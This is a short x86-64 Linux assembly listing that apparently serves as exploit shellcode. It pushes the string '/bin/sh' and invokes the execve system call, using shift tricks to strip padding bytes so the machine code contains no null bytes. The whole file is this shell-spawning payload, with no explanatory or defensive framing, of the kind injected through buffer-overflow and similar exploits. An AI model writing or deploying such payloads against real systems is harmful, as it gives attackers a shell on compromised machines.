.section .data

.section .text

.globl _start
_start:

xor %rsi,%rsi
xor %rdx,%rdx
movq $0x1168732f6e69622f, %rbx
shl $0x08, %rbx
shr $0x08, %rbx
pushq %rbx
movq $0x1111113b, %rax

movq %rsp, %rdi
shl $0x38, %rax
shr $0x38, %rax

syscall
